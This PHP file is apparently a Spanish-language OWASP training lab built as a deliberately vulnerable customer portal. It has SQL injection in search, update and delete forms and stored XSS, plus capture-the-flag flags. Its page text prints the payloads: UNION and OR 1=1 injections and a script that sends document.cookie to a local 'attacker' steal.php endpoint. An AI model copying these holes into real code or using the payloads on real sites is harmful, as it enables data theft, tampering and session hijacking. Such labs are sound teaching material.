<?php
// ===========================================================================
//  PORTAL DE CLIENTES — LABORATORIO AVANZADO DÍA 2 (OWASP A03 realista)
// ---------------------------------------------------------------------------
//  Secciones NUEVAS, independientes de los Tracks del Día 1 (no tocan index.php
//  ni la base /tmp/intranet.sqlite). Usan su propia DB: /tmp/lab_avanzado.sqlite
//
//  Objetivo didáctico (ataque + defensa en las diapositivas del Día 2):
//    1) SQLi de LECTURA   -> volcar toda la tabla y columnas sensibles (UNION).
//    2) SQLi de ESCRITURA -> modificar TODOS los registros (UPDATE con OR 1=1).
//    3) SQLi de BORRADO   -> eliminar TODOS los registros (DELETE con OR 1=1).
//    4) XSS ALMACENADO    -> robar document.cookie y exfiltrarla al servidor
//                            atacante (http://localhost:5000/steal.php).
//
//  ⚠️ Código intencionalmente vulnerable SOLO para entrenamiento controlado.
// ===========================================================================

session_start();
// Cookies deliberadamente débiles (sin HttpOnly) para que el XSS pueda leerlas.
if (!isset($_COOKIE['SESION_ID'])) {
    setcookie('SESION_ID', '1002', 0, '/'); // 1001 = Admin (cambiar en DevTools)
}
if (!isset($_COOKIE['datos_usuario'])) {
    setcookie('datos_usuario', base64_encode('{"usuario":"empleado","rol":"lector"}'), 0, '/');
}

$db = new PDO('sqlite:/tmp/lab_avanzado.sqlite');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// --- Esquema + semilla --------------------------------------------------------
function sembrar(PDO $db) {
    $db->exec("DROP TABLE IF EXISTS clientes;");
    $db->exec("DROP TABLE IF EXISTS mensajes;");
    $db->exec("CREATE TABLE clientes (id INTEGER PRIMARY KEY, nombre TEXT, email TEXT, tarjeta TEXT, saldo TEXT, secreto TEXT);");
    $db->exec("CREATE TABLE mensajes (id INTEGER PRIMARY KEY AUTOINCREMENT, autor TEXT, texto TEXT);");
    $db->exec("INSERT INTO clientes VALUES (1,'Juan Perez','jperez@empresa.cl','4111-1111-1111-1111','\$320.000','dato interno 1');");
    $db->exec("INSERT INTO clientes VALUES (2,'Maria Soto','msoto@empresa.cl','5500-0000-0000-0004','\$980.500','dato interno 2');");
    $db->exec("INSERT INTO clientes VALUES (3,'Gerencia General','gerencia@empresa.cl','3400-000000-00009','\$7.450.000','FLAG{SQLI_UNION_LECTURA_TOTAL}');");
    $db->exec("INSERT INTO clientes VALUES (4,'Ana Rojas','arojas@empresa.cl','6011-0009-9013-9424','\$155.250','dato interno 4');");
    $db->exec("INSERT INTO mensajes (autor,texto) VALUES ('Soporte','Bienvenido al portal de clientes.');");
    $db->exec("INSERT INTO mensajes (autor,texto) VALUES ('Mesa de Ayuda','Horario de atencion 9 a 18 hrs.');");
}
try { $db->query("SELECT 1 FROM clientes LIMIT 1"); } catch (Exception $e) { sembrar($db); }
if (isset($_GET['reset_av'])) { sembrar($db); header('Location: portal-avanzado.php'); exit; }

$msg = "";          // mensaje de sistema
$flag = "";         // flag ganada en esta acción
$resultados = null; // filas del buscador
$sql_ejecutado = "";

// --- 1) BUSCADOR DE CLIENTES  (SQLi de LECTURA: UNION / OR 1=1) ----------------
if (isset($_GET['buscar'])) {
    $q = $_GET['buscar'];
    // ❌ Concatenacion directa dentro del LIKE: permite romper la consulta.
    $sql = "SELECT id, nombre, email, saldo FROM clientes WHERE nombre LIKE '%$q%'";
    $sql_ejecutado = $sql;
    try {
        $resultados = $db->query($sql)->fetchAll(PDO::FETCH_ASSOC);
        if (stripos($q, 'union') !== false || stripos($q, "or '1'='1") !== false || stripos($q, 'or 1=1') !== false) {
            $flag = "FLAG{SQLI_LECTURA_TABLA_COMPLETA}";
        }
    } catch (Exception $e) {
        $msg = "Fatal SQL Error (buscador): " . $e->getMessage();
    }
}

// --- 2) ACTUALIZAR SALDO POR ID  (SQLi de ESCRITURA: UPDATE con OR 1=1) ---------
if (isset($_POST['accion']) && $_POST['accion'] === 'actualizar_saldo') {
    $id = $_POST['id_cliente'];     // ❌ sin intval -> inyectable en el WHERE
    $monto = $_POST['nuevo_saldo'];
    $sql = "UPDATE clientes SET saldo = '$monto' WHERE id = $id";
    $sql_ejecutado = $sql;
    try {
        $afectadas = $db->exec($sql);
        $total = (int)$db->query("SELECT COUNT(*) FROM clientes")->fetchColumn();
        $msg = "Filas afectadas por el UPDATE: $afectadas de $total.";
        if ($afectadas > 1) { $flag = "FLAG{SQLI_UPDATE_MASIVO_WHERE_ROTO}"; }
    } catch (Exception $e) {
        $msg = "Fatal SQL Error (update): " . $e->getMessage();
    }
}

// --- 3) ELIMINAR MENSAJE POR ID  (SQLi de BORRADO: DELETE con OR 1=1) -----------
if (isset($_POST['accion']) && $_POST['accion'] === 'eliminar_mensaje') {
    $id = $_POST['id_mensaje'];     // ❌ sin intval -> inyectable en el WHERE
    $sql = "DELETE FROM mensajes WHERE id = $id";
    $sql_ejecutado = $sql;
    try {
        $afectadas = $db->exec($sql);
        $msg = "Mensajes eliminados por el DELETE: $afectadas.";
        if ($afectadas > 1) { $flag = "FLAG{SQLI_DELETE_MASIVO_WHERE_ROTO}"; }
    } catch (Exception $e) {
        $msg = "Fatal SQL Error (delete): " . $e->getMessage();
    }
}

// --- 4) MURO DE SOPORTE  (XSS ALMACENADO -> exfiltracion de cookie) -------------
if (isset($_POST['accion']) && $_POST['accion'] === 'publicar_muro') {
    $stmt = $db->prepare("INSERT INTO mensajes (autor, texto) VALUES (?, ?)");
    $stmt->execute([$_POST['autor'], $_POST['texto']]);  // el texto se imprime SIN escapar
    header('Location: portal-avanzado.php#muro'); exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Portal de Clientes — Laboratorio Avanzado OWASP (Día 2)</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
</head>
<body class="bg-slate-100 text-slate-800 p-6">
  <div class="max-w-6xl mx-auto">
    <header class="bg-indigo-950 text-white p-6 rounded-xl mb-6 flex justify-between items-center">
      <div>
        <h1 class="text-2xl font-bold"><i class="fa-solid fa-flask-vial mr-2"></i>Portal de Clientes — Lab Avanzado Día 2</h1>
        <p class="text-indigo-300 text-sm">Inyección SQL realista (leer / modificar / borrar) y XSS con robo de cookie</p>
      </div>
      <div class="text-right text-sm">
        <span class="bg-indigo-600 px-3 py-1 rounded">SESION_ID: <?php echo htmlspecialchars($_COOKIE['SESION_ID'] ?? '1002'); ?></span>
        <a href="?reset_av=1" class="ml-3 bg-amber-600 px-3 py-1 rounded hover:bg-amber-700">Reiniciar datos del lab</a>
        <a href="index.php" class="ml-2 bg-slate-600 px-3 py-1 rounded hover:bg-slate-700">Volver al portal clásico</a>
      </div>
    </header>

    <?php if ($flag): ?>
      <div class="bg-emerald-100 border-l-4 border-emerald-600 text-emerald-900 p-4 rounded mb-4 font-bold">🏴 <?php echo $flag; ?></div>
    <?php endif; ?>
    <?php if ($msg): ?>
      <div class="bg-amber-100 border-l-4 border-amber-600 text-amber-900 p-3 rounded mb-4 font-semibold text-sm"><?php echo htmlspecialchars($msg); ?></div>
    <?php endif; ?>
    <?php if ($sql_ejecutado): ?>
      <div class="bg-slate-900 text-emerald-300 p-3 rounded mb-6 text-xs font-mono overflow-x-auto">SQL ejecutado ➜ <?php echo htmlspecialchars($sql_ejecutado); ?></div>
    <?php endif; ?>

    <div class="grid grid-cols-2 gap-6">

      <!-- 1. SQLi LECTURA -->
      <section class="bg-white p-5 rounded-xl shadow border">
        <h2 class="font-bold text-lg text-indigo-700 mb-1">1. Buscador de Clientes — SQLi de Lectura</h2>
        <p class="text-xs text-slate-500 mb-3">Prueba: <code>%' OR '1'='1</code> (toda la tabla) &nbsp;·&nbsp; <code>' UNION SELECT id,nombre,tarjeta,secreto FROM clientes-- </code> (datos sensibles)</p>
        <form method="GET" class="flex gap-2 mb-3 text-sm">
          <input type="text" name="buscar" placeholder="Nombre del cliente..." class="border p-2 rounded flex-1" value="<?php echo isset($_GET['buscar']) ? htmlspecialchars($_GET['buscar']) : ''; ?>">
          <button class="bg-indigo-600 text-white px-4 py-2 rounded font-semibold">Buscar</button>
        </form>
        <?php if (is_array($resultados)): ?>
          <div class="space-y-1">
            <?php foreach ($resultados as $r): ?>
              <div class="text-xs bg-slate-100 p-2 rounded border font-mono">
                #<?php echo htmlspecialchars($r['id']); ?> ·
                <?php echo htmlspecialchars($r['nombre']); ?> ·
                <?php echo htmlspecialchars($r['email']); ?> ·
                <?php echo htmlspecialchars($r['saldo']); ?>
              </div>
            <?php endforeach; ?>
            <?php if (!$resultados): ?><div class="text-xs text-slate-400">Sin resultados.</div><?php endif; ?>
          </div>
        <?php endif; ?>
      </section>

      <!-- 2. SQLi ESCRITURA (UPDATE) -->
      <section class="bg-white p-5 rounded-xl shadow border">
        <h2 class="font-bold text-lg text-indigo-700 mb-1">2. Ajustar Saldo por ID — SQLi de Modificación</h2>
        <p class="text-xs text-slate-500 mb-3">En el campo ID prueba: <code>0 OR 1=1</code> para modificar <b>todos</b> los saldos.</p>
        <form method="POST" class="space-y-2 text-sm">
          <input type="hidden" name="accion" value="actualizar_saldo">
          <div class="flex gap-2">
            <input type="text" name="id_cliente" placeholder="ID (ej: 1)" value="1" class="border p-2 rounded w-1/2">
            <input type="text" name="nuevo_saldo" placeholder="Nuevo saldo" value="$0" class="border p-2 rounded w-1/2">
          </div>
          <button class="bg-indigo-600 text-white px-4 py-2 rounded font-semibold w-full">Actualizar saldo</button>
        </form>
        <div class="mt-3 text-xs">
          <b>Estado actual:</b>
          <?php foreach ($db->query("SELECT id, nombre, saldo FROM clientes ORDER BY id") as $c): ?>
            <div class="font-mono text-slate-600">#<?php echo $c['id']; ?> <?php echo htmlspecialchars($c['nombre']); ?> → <?php echo htmlspecialchars($c['saldo']); ?></div>
          <?php endforeach; ?>
        </div>
      </section>

      <!-- 3. SQLi BORRADO (DELETE) -->
      <section class="bg-white p-5 rounded-xl shadow border">
        <h2 class="font-bold text-lg text-indigo-700 mb-1">3. Eliminar Mensaje por ID — SQLi de Borrado</h2>
        <p class="text-xs text-slate-500 mb-3">En el campo ID prueba: <code>0 OR 1=1</code> para borrar <b>todos</b> los mensajes.</p>
        <form method="POST" class="flex gap-2 text-sm">
          <input type="hidden" name="accion" value="eliminar_mensaje">
          <input type="text" name="id_mensaje" placeholder="ID del mensaje" value="1" class="border p-2 rounded flex-1">
          <button class="bg-red-600 text-white px-4 py-2 rounded font-semibold">Eliminar</button>
        </form>
        <p class="text-xs text-slate-500 mt-3">Mensajes actuales: <b><?php echo (int)$db->query("SELECT COUNT(*) FROM mensajes")->fetchColumn(); ?></b></p>
      </section>

      <!-- 4. XSS ALMACENADO + EXFILTRACION -->
      <section id="muro" class="bg-white p-5 rounded-xl shadow border">
        <h2 class="font-bold text-lg text-indigo-700 mb-1">4. Muro de Soporte — XSS Almacenado (robo de cookie)</h2>
        <p class="text-xs text-slate-500 mb-3">Payload de robo de sesión hacia el servidor atacante (puerto 5000):</p>
        <pre class="bg-slate-900 text-emerald-300 p-2 rounded text-[11px] overflow-x-auto mb-3">&lt;script&gt;new Image().src="http://localhost:5000/steal.php?c="+encodeURIComponent(document.cookie)+"&amp;u="+location.host;&lt;/script&gt;</pre>
        <form method="POST" class="flex gap-2 text-sm mb-3">
          <input type="hidden" name="accion" value="publicar_muro">
          <input type="text" name="autor" placeholder="Autor" value="Soporte" class="border p-2 rounded w-1/3">
          <input type="text" name="texto" placeholder="Mensaje (vulnerable a XSS)" class="border p-2 rounded flex-1">
          <button class="bg-emerald-600 text-white px-3 py-2 rounded font-semibold">Publicar</button>
        </form>
        <div class="space-y-1 text-xs">
          <?php foreach ($db->query("SELECT * FROM mensajes ORDER BY id DESC LIMIT 6") as $m): ?>
            <!-- ❌ Se imprime el texto SIN htmlspecialchars: XSS almacenado -->
            <div class="border-b py-1"><b><?php echo htmlspecialchars($m['autor']); ?>:</b> <?php echo $m['texto']; ?></div>
          <?php endforeach; ?>
        </div>
      </section>

    </div>

    <footer class="mt-6 text-xs text-slate-500">
      Lab avanzado Día 2 · DB aislada: /tmp/lab_avanzado.sqlite · Servidor atacante (C2): <a class="underline" href="http://localhost:5000/">http://localhost:5000/</a>
    </footer>
  </div>
</body>
</html>
